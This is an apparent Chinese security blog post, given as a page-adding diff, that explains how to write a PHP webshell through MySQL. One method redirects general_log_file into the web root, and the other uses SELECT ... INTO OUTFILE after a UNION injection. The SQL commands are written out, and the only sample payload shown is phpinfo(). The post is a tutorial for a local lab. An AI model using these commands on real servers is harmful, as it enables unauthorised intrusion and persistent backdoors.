@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>MySQL写Shell | A10ng_&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="日志写马 条件 MySQL的两个全局变量： general_log指的是日志保存状态，一共有两个值（ON/OFF）ON代表开启 OFF代表关闭。 general_log_file 指">
+<meta name="author" content="admin">
+<link rel="canonical" href="https://a10nggg.github.io/archives/132/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css" integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://a10nggg.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://a10nggg.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://a10nggg.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://a10nggg.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://a10nggg.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://a10nggg.github.io/archives/132/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="MySQL写Shell" />
+<meta property="og:description" content="日志写马 条件 MySQL的两个全局变量： general_log指的是日志保存状态，一共有两个值（ON/OFF）ON代表开启 OFF代表关闭。 general_log_file 指" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://a10nggg.github.io/archives/132/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-01-20T09:32:32+00:00" />
+<meta property="article:modified_time" content="2022-01-20T09:32:32+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="MySQL写Shell"/>
+<meta name="twitter:description" content="日志写马 条件 MySQL的两个全局变量： general_log指的是日志保存状态，一共有两个值（ON/OFF）ON代表开启 OFF代表关闭。 general_log_file 指"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://a10nggg.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "MySQL写Shell",
+      "item": "https://a10nggg.github.io/archives/132/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "MySQL写Shell",
+  "name": "MySQL写Shell",
+  "description": "日志写马 条件 MySQL的两个全局变量： general_log指的是日志保存状态，一共有两个值（ON/OFF）ON代表开启 OFF代表关闭。 general_log_file 指",
+  "keywords": [
+    
+  ],
+  "articleBody": "日志写马 条件 MySQL的两个全局变量：\ngeneral_log指的是日志保存状态，一共有两个值（ON/OFF）ON代表开启 OFF代表关闭。\ngeneral_log_file 指的是日志的保存路径。\n实操 输入命令查看日志设置状态。\nshow global variables like \"%general_log%\";\n{.wp-editor-md-post-content-link}\n当前状态是关闭的，我们输入命令打开。\nset global general_log='on';\n打开之后，他会记录我们的操作记录到general_log_file的文件里。\n！注：不管sql语句是否正确都会记录进去。\n{.wp-editor-md-post-content-link}\ngeneral_log_file跟general_log一样，可以通过数据库命令修改。\n我们将日志文件的后缀改为php，并且把它放在web目录里，那么就可以把webshell写进去了。\n先设置新的log路径。\nset global general_log_file='C:\\\\PHPStudy\\\\PHPTutorial\\\\WWW\\\\shell.php';\n{.wp-editor-md-post-content-link}\n然后在通过日志将shell写进去。\n{.wp-editor-md-post-content-link}\n{.wp-editor-md-post-content-link}\n解析成功。\ninto outfile写shell 条件 mysql用户拥有file_priv权限\n输入show global variables like '%secure%'；\n当secure_file_priv为空而不是NULL，就可以写入磁盘的目录。\nsecure_file_priv设置通过设置my.ini来配置，不能通过SQL语言来修改，因为它是只读变量。\n实操 一般是在union后面加写入语句。\nmysql\u003e select '\u003c?php phpinfo();?\u003e' into outfile 'C:\\\\PHPStudy\\\\PHPTutorial\\\\WWW\\\n\\1.php';\nQuery OK, 1 row affected (0.00 sec)\n然后就会在相应目录写入shell。\n{.wp-editor-md-post-content-link}\n",
+  "wordCount" : "514",
+  "inLanguage": "en",
+  "datePublished": "2022-01-20T09:32:32Z",
+  "dateModified": "2022-01-20T09:32:32Z",
+  "author":{
+    "@type": "Person",
+    "name": "admin"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://a10nggg.github.io/archives/132/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "A10ng_'s Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://a10nggg.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://a10nggg.github.io/" accesskey="h" title="A10ng_&#39;s Blog (Alt + H)">A10ng_&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://a10nggg.github.io/" title="首页">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/posts/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/categories/" title="分类">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/tags/" title="标签">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/about/" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/search/" title="搜索">
+                    <span>搜索</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      MySQL写Shell
+    </h1>
+    <div class="post-meta"><span title='2022-01-20 09:32:32 +0000 +0000'>January 20, 2022</span>&nbsp;·&nbsp;admin
+
+</div>
+  </header> 
+  <div class="post-content"><h1 id="日志写马">日志写马<a hidden class="anchor" aria-hidden="true" href="#日志写马">#</a></h1>
+<h2 id="条件">条件<a hidden class="anchor" aria-hidden="true" href="#条件">#</a></h2>
+<p>MySQL的两个全局变量：<br>
+general_log指的是日志保存状态，一共有两个值（ON/OFF）ON代表开启 OFF代表关闭。<br>
+general_log_file 指的是日志的保存路径。</p>
+<h2 id="实操">实操<a hidden class="anchor" aria-hidden="true" href="#实操">#</a></h2>
+<p>输入命令查看日志设置状态。<br>
+<code>show global variables like &quot;%general_log%&quot;;</code><br>
+<a href="/uploads/2022/01/wp_editor_md_a5c6805e498e857787cae90df1dd5373.jpg"><img loading="lazy" src="/uploads/2022/01/wp_editor_md_a5c6805e498e857787cae90df1dd5373.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}<br>
+当前状态是关闭的，我们输入命令打开。<br>
+<code>set global general_log='on';</code><br>
+打开之后，他会记录我们的操作记录到general_log_file的文件里。<br>
+！注：不管sql语句是否正确都会记录进去。<br>
+<a href="/uploads/2022/01/wp_editor_md_d05f6e6b63a75d04bc45933ce7888a44.jpg"><img loading="lazy" src="/uploads/2022/01/wp_editor_md_d05f6e6b63a75d04bc45933ce7888a44.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}<br>
+general_log_file跟general_log一样，可以通过数据库命令修改。<br>
+我们将日志文件的后缀改为php，并且把它放在web目录里，那么就可以把webshell写进去了。<br>
+先设置新的log路径。<br>
+<code>set global general_log_file='C:\\PHPStudy\\PHPTutorial\\WWW\\shell.php';</code><br>
+<a href="/uploads/2022/01/wp_editor_md_fde2f73f54752a692784a316194dffa5.jpg"><img loading="lazy" src="/uploads/2022/01/wp_editor_md_fde2f73f54752a692784a316194dffa5.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}<br>
+然后在通过日志将shell写进去。<br>
+<a href="/uploads/2022/01/wp_editor_md_b4fc7ad4f83b4896e7f246e2720b19ed.jpg"><img loading="lazy" src="/uploads/2022/01/wp_editor_md_b4fc7ad4f83b4896e7f246e2720b19ed.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}<br>
+<a href="/uploads/2022/01/wp_editor_md_d8fed7fe8c1fd0a0ecdb778b9f566068.jpg"><img loading="lazy" src="/uploads/2022/01/wp_editor_md_d8fed7fe8c1fd0a0ecdb778b9f566068.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}<br>
+解析成功。</p>
+<h1 id="into-outfile写shell">into outfile写shell<a hidden class="anchor" aria-hidden="true" href="#into-outfile写shell">#</a></h1>
+<h2 id="条件-1">条件<a hidden class="anchor" aria-hidden="true" href="#条件-1">#</a></h2>
+<p>mysql用户拥有file_priv权限<br>
+输入<code>show global variables like '%secure%'；</code><br>
+当secure_file_priv为空而不是NULL，就可以写入磁盘的目录。<br>
+secure_file_priv设置通过设置my.ini来配置，不能通过SQL语言来修改，因为它是只读变量。</p>
+<h1 id="实操-1">实操<a hidden class="anchor" aria-hidden="true" href="#实操-1">#</a></h1>
+<p>一般是在union后面加写入语句。<br>
+<code>mysql&gt; select '&lt;?php phpinfo();?&gt;' into outfile 'C:\\PHPStudy\\PHPTutorial\\WWW\&lt;br /&gt; \1.php';&lt;br /&gt; Query OK, 1 row affected (0.00 sec)</code><br>
+然后就会在相应目录写入shell。<br>
+<a href="/uploads/2022/01/wp_editor_md_a45833e89ce3c683e96c61fa46e892a1.jpg"><img loading="lazy" src="/uploads/2022/01/wp_editor_md_a45833e89ce3c683e96c61fa46e892a1.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2024 <a href="https://a10nggg.github.io/">A10ng_&#39;s Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
